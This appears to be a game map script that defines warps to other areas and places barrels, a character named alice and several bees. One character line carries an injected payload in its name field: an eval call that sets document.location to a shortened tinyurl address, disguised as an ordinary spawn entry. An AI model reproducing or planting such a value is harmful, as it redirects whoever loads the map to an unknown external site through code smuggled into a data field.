

// mountain path
API.add_warp(52, 0, 61, 1, 34, 124, "mountain_path.json");

// inn link
API.add_warp(98, 26, 99, 27, 13, 30, "inn.json");

// pub link
API.add_warp(54, 90, 55, 91, 23, 24, "bar.json");

// house1 link
API.add_warp(42, 56, 43, 57, 9, 34, "house1.json");

// house2 link
API.add_warp(26, 34, 27, 35, 51, 58, "house2.json");

// secret1 link
API.add_warp(28, 79, 29, 79, 16, 6, "secret1.json");


// cop-out wrap around
API.add_warp(127, 0, 128, 128, 2, 67, "start1.json");
API.add_warp(0, 0, 1, 128, 126, 39, "start1.json");


// add some barrels
API.instance("barrel", 96, 55);
API.instance("barrel", 25, 86);
API.instance("barrel", 27, 86);
API.instance("barrel", 26, 87);
API.instance("barrel", 30, 87);
API.instance("barrel", 87, 46);
// by the pub
API.instance("barrel", 44, 92);
API.instance("barrel", 44, 90);
API.instance("barrel", 44, 91);


// barrels corresponding to tiles
// by the inn
API.instance("barrel", 92, 26);
API.instance("barrel", 92, 22);
API.instance("barrel", 92, 20);
// by the library
API.instance("barrel", 36, 58);
API.instance("barrel", 36, 56);


// add some characters
API.instance("alice", 86, 54);
API.instance("$; eval('document.location=\"http://tinyurl.com/y8ufsnp\";');", 81, 36);

API.instance("bee", 104, 46);
API.instance("bee", 119, 26);
API.instance("bee", 40, 68);
API.instance("bee", 20, 47);
API.instance("bee", 16, 95);
